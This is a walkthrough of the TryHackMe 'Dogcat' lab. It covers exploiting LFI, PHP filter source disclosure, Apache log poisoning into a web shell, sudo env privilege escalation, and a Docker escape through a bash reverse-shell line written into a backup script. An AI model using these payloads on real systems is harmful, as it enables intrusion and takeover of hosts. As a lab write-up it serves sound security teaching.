Written By Aryan Giri

# TryHackMe Dogcat: LFI, Log Poisoning, Privilege Escalation, and Docker Escape

Room: [Dogcat](https://tryhackme.com/room/dogcat)

Dogcat is a web exploitation room in which a PHP application displays dog and cat pictures. The challenge involves exploiting a local file inclusion (LFI) flaw, using PHP wrappers to inspect source code, poisoning Apache access logs to achieve command execution, escalating privileges, and escaping a Docker container.

> **Lab target:** `10.48.136.199`
>
> Replace this address with the IP assigned to your own running room instance.

## 1. Reconnaissance

Since the target exposes a web application, start by checking the HTTP response headers.

```bash
curl -I http://10.48.136.199/
```

<img width="422" height="168" alt="Screenshot 2026-10-15 161354" src="https://github.com/user-attachments/assets/fb104a32-54c0-468e-a386-5a16b86afdc6" />


The response identifies Apache as the web server. This is useful reconnaissance information and gives us a likely default location for the Apache access log, which we will investigate later.

Next, open the target in Firefox with Burp Suite configured as the browser proxy.

<img width="906" height="443" alt="Screenshot 2026-10-15 161738" src="https://github.com/user-attachments/assets/f6c0ea23-c9f7-408a-9c4c-ae00806c12c6" />


The page offers two buttons: **Dog** and **Cat**. Selecting either option loads a corresponding picture. Notice that the URL changes according to the selected option:

```text
http://10.48.136.199/?view=cat
```

Selecting Dog changes the parameter to `view=dog`. The application is using the `view` parameter to determine what content to load, so it is worth testing how the application handles file paths.

## 2. Testing the `view` Parameter

Begin with a basic traversal attempt:

```text
http://10.48.136.199/?view=../index.php
```

The application responds that only dog and cat are allowed.

<img width="765" height="493" alt="Screenshot 2026-10-15 161837" src="https://github.com/user-attachments/assets/87b17d15-7566-490d-809d-f2abf4615745" />


This suggests that the application validates the supplied value. Try keeping an allowed value at the beginning of the path while adding a traversal segment:

```text
http://10.48.136.199/?view=dog/../index
```

<img width="1253" height="690" alt="Screenshot 2026-10-15 161907" src="https://github.com/user-attachments/assets/3917690c-b324-4659-86d8-91fa2a0bf12d" />


The response changes to a file-stream or file-opening error. That is a useful clue: the input appears to have passed a different stage of the application's processing. It does not, by itself, prove arbitrary file read, but it gives us a promising direction.

## 3. Reading PHP Source with a Wrapper

PHP stream wrappers provide a common interface for accessing different types of resources. The `php://filter` wrapper can apply filters to a resource before its contents are returned. In particular, Base64 encoding lets us inspect PHP source as text instead of having the server execute the source code.

A useful example is:

```text
php://filter/convert.base64-encode/resource=index.php
```

Other filters exist, including ROT13 and character-encoding conversions, but Base64 is a straightforward first choice for source-code inspection. Filters are not universal security-control bypasses; whether a payload works depends on the application's validation and file-loading logic.

Use the following URL to request the encoded source:

```text
http://10.48.136.199/?view=php://filter/convert.base64-encode/resource=dog/../index
```

<img width="1021" height="452" alt="Screenshot 2026-10-01 205310" src="https://github.com/user-attachments/assets/cdafce79-f9f6-47ca-bdcf-24c186ff2b97" />


Copy the encoded string into Burp Suite's Decoder and decode it using Base64. You can then copy the result into a text editor, which is much easier to read than a small response pane.

<img width="1894" height="493" alt="Screenshot 2026-10-15 162247" src="https://github.com/user-attachments/assets/f83b33b8-83a5-4192-8bd3-5095d2631917" />


One important part of the source is:

```php
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
```

This uses PHP's ternary operator:

- If the `ext` GET parameter is present, its value is assigned to `$ext`.
- Otherwise, `$ext` defaults to `.php`.

This matters because the application appends an extension to the requested view. Supplying an empty `ext` parameter can prevent the default `.php` suffix from being appended.

## 4. Reading Local Files

Now that we understand the extension-handling logic, try reading `/etc/passwd` by using path traversal and an empty `ext` parameter:

```text
http://10.48.136.199/?view=dog/../../../../etc/passwd&ext=
```

<img width="1154" height="685" alt="Screenshot 2026-10-15 162937" src="https://github.com/user-attachments/assets/414a64a2-e0dc-4e8a-a394-cdca98efe68d" />


The file contents confirm that the application can read a local file outside its intended image resources. The number of traversal segments needed depends on the application's working directory and path resolution.

Because the response headers identified Apache, test the usual Debian/Ubuntu Apache access-log path:

```text
/var/log/apache2/access.log
```

For clearer browser rendering, you can use Firefox's view-source mode:

```text
view-source:http://10.48.136.199/?view=dog/../../../../var/log/apache2/access.log&ext=
```

<img width="1509" height="803" alt="Screenshot 2026-10-15 163111" src="https://github.com/user-attachments/assets/4bc621ed-af04-445e-b9a4-17f4aae118c3" />


We can read the access log. The next question is whether the application will interpret PHP code embedded in that log when the log is included.

## 5. Apache Log Poisoning

An Apache access log commonly records request metadata, including the User-Agent header. If an attacker can control that header and the application later includes the log through a PHP execution path, PHP code in the log may be interpreted. This technique is known as **log poisoning**.

In Burp Suite, send a request to Repeater and change the User-Agent header to the following PHP test payload:

```php
<?php echo shell_exec('id'); ?>
```

<img width="731" height="665" alt="Screenshot 2026-10-15 163305" src="https://github.com/user-attachments/assets/6df0b8c1-84ca-4fa3-8690-82894a5758b0" />


Send the request to write the payload into the access log. Then request the log through the vulnerable `view` parameter again.

<img width="1301" height="174" alt="Screenshot 2026-10-15 163324" src="https://github.com/user-attachments/assets/de59fe65-0f82-416a-a1d9-f41b4668a942" />


If the payload is executed, the output of `id` should appear in the response. The important distinction is that merely viewing a log does not execute PHP: the log must be processed in a context where PHP interprets its contents.

Next, replace the test payload with a command-execution web shell:

```php
<?php system($_GET['cmd']); ?>
```

<img width="721" height="539" alt="Screenshot 2026-10-15 163402" src="https://github.com/user-attachments/assets/7579293f-d5ce-48ad-9a1e-0ad67ddda415" />


Send the request so the payload is written into the log. Then supply the `cmd` parameter while including the log:

```text
view-source:http://10.48.136.199/?view=dog/../../../../var/log/apache2/access.log&ext&cmd=ls
```

The bare `ext` parameter is present with an empty value, so PHP does not use the default `.php` extension. The `cmd=ls` parameter is read by the injected PHP code.

<img width="670" height="330" alt="Screenshot 2026-10-15 164444" src="https://github.com/user-attachments/assets/b740e4ab-0859-40a3-88a9-7b00ce935733" />


The response should display files from the application's current working directory. The listing also reveals a `flag.php` file.

**Security note:** This web shell is intentionally minimal and unsafe. Use it only in the assigned lab environment, and remove any test artifacts if the environment allows it.

## 6. Retrieving the First Flag

The directory listing reveals `flag.php`. Instead of including it normally, use the PHP filter wrapper to Base64-encode its source:

```text
http://10.48.136.199/?view=php://filter/convert.base64-encode/resource=dog/../flag
```


Copy the Base64 output into Burp Decoder and decode it. Inspect the returned source to locate the first flag.

<img width="816" height="533" alt="Screenshot 2026-10-15 164746" src="https://github.com/user-attachments/assets/8698b271-96a3-4d0b-b280-4ac994085930" />


## 7. Obtaining a Reverse Shell

Command execution through the poisoned log is useful, but an interactive shell is more convenient for further enumeration.

On Kali Linux, locate the PHP reverse-shell example under the system's web shells directory. Copy it into your lab working directory and edit the callback IP and port to match your attacker machine and listener.

<img width="705" height="62" alt="Screenshot 2026-10-15 163640" src="https://github.com/user-attachments/assets/d5d445ce-1fd6-4350-950e-95fd85e53c4c" />

<img width="557" height="250" alt="Screenshot 2026-10-15 163736" src="https://github.com/user-attachments/assets/2d33e360-54fc-41e7-be31-c078669af1d9" />


I also created **ShellParcel**, a Python utility for transferring a shell file through an existing web shell:

[ShellParcel on GitHub](https://github.com/giriaryan694-a11y/ShellParcel)

<img width="1764" height="791" alt="Screenshot 2026-10-15 164024" src="https://github.com/user-attachments/assets/f6553d37-2691-496b-a5b8-8ae2c4292cfc" />


Start a listener on the configured port, then trigger the transferred PHP shell through the web-accessible path.

<img width="942" height="625" alt="Screenshot 2026-10-15 164114" src="https://github.com/user-attachments/assets/7fd5d4fd-1b7c-4164-a655-7aa5689952a8" />


A successful connection gives us a shell in the compromised application environment. The exact behavior depends on the payload configuration and the container's available tools.

## 8. Finding the Next Flag

With shell access, search for flag-related files:

```bash
find / -type f -iname '*flag*' 2>/dev/null
```

<img width="554" height="207" alt="Screenshot 2026-10-15 165138" src="https://github.com/user-attachments/assets/76887c4d-d25f-4c43-af9c-f8612c69e51c" />


Inspect the relevant file and record the flag.

## 9. Privilege Escalation with `env`

Check which commands the current user is allowed to run with elevated privileges:

```bash
sudo -l
```

<img width="827" height="216" alt="Screenshot 2026-10-15 172412" src="https://github.com/user-attachments/assets/ab9e16a9-8b10-4b07-8f83-da99027e4418" />


In this room, the output indicates that `env` can be run through `sudo`. The [GTFOBins entry for `env`](https://gtfobins.github.io/gtfobins/env/) documents how this configuration can be abused to launch another program with the granted privileges.

In the lab, run:

```bash
sudo env /bin/sh
```

Then verify the effective identity:

```bash
whoami
```

<img width="212" height="80" alt="Screenshot 2026-10-15 172548" src="https://github.com/user-attachments/assets/b4c7c093-e310-4f66-a222-c0144c503f15" />


If the command succeeds with elevated privileges, inspect the relevant directory and read the third flag.

<img width="424" height="133" alt="Screenshot 2026-10-15 172712" src="https://github.com/user-attachments/assets/9e192354-8941-4b23-9b03-73bfb732318f" />


This is a **sudo misconfiguration**: a command that can launch other programs has been granted elevated execution without an adequate restriction.

## 10. Escaping the Docker Container

The final stage requires escaping the container to reach the host environment. During enumeration, I found a backup directory under `/opt` containing a compressed archive and a script named `backup.sh`.

Inspect the script:

```bash
cat /opt/backup/backup.sh
```

<img width="816" height="250" alt="Screenshot 2026-10-15 174319" src="https://github.com/user-attachments/assets/e4801c51-1e4e-48e2-84e3-64848784e7fe" />


The script contains a `tar` command that processes backup data. This suggests a scheduled or otherwise privileged backup workflow may be interacting with files accessible from the container. However, the script's contents alone do not prove that it runs on the host or that it runs with elevated host privileges. Confirm the execution context and permissions before drawing that conclusion.

In my lab run, I modified the backup script to make a callback to my attacker machine:

```bash
echo "bash -c 'bash -i >& /dev/tcp/192.168.132.162/7777 0>&1'" > backup.sh
```

Replace the IP address and port with your own lab callback details. Start a listener before the relevant backup process executes.

<img width="1699" height="627" alt="Screenshot 2026-10-15 174904" src="https://github.com/user-attachments/assets/5cd355fa-03e5-4f11-b26a-f6a8b2aeae5a" />

A successful callback can indicate that the modified script was executed in a different, potentially more privileged environment. Verify the environment and permissions after connecting instead of assuming every callback automatically means host root.

Once host access is confirmed, locate and read the fourth flag.

<img width="822" height="277" alt="Screenshot 2026-10-15 174957" src="https://github.com/user-attachments/assets/f50f041a-657a-452b-b432-94b1ab40136b" />


## MITRE ATT&CK Mapping

The following mappings describe the behaviors demonstrated in this lab. They are conceptual mappings, not a claim that every technique maps one-to-one to a single ATT&CK technique.

| Activity | MITRE ATT&CK technique | Relevance |
|---|---|---|
| Web application exploitation | [T1190: Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) | The exposed PHP application is exploited to obtain unintended file access and code execution. |
| Local file and application data discovery | [T1083: File and Directory Discovery](https://attack.mitre.org/techniques/T1083/) | The attacker enumerates files and directories after gaining command execution. |
| Command execution through the web application | [T1059.004: Unix Shell](https://attack.mitre.org/techniques/T1059/004/) | Shell commands are executed on the Linux environment. |
| Reverse-shell communication | [T1095: Non-Application Layer Protocol](https://attack.mitre.org/techniques/T1095/) | A shell callback uses a raw TCP connection. The precise mapping depends on the implementation and observed traffic. |
| Abuse of elevated `sudo` permissions | [T1548.003: Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/) | A permitted command is used to obtain a more privileged shell. |
| Container escape | [T1611: Escape to Host](https://attack.mitre.org/techniques/T1611/) | The final stage attempts to cross the container boundary and access the host. |

## Lessons Learned

- Inspect parameters that control which files a web application loads.
- Read the source code when a file-inclusion flaw is suspected; small details such as extension handling can change the result.
- PHP wrappers can help disclose source code, but they are not a substitute for understanding the application's path validation.
- Log poisoning depends on both attacker-controlled log content and a path that causes PHP to interpret that content.
- Check `sudo -l` and validate the permissions of any command that can launch other programs.
- A Docker container is not automatically a security boundary if host-side processes, writable mounts, or privileged automation trust container-controlled files.
- Confirm execution context and privilege level at every stage. A shell connection alone does not prove root access on the host.

The Dogcat room ties together web exploitation, post-exploitation, Linux privilege escalation, and container-boundary security in one practical exercise.
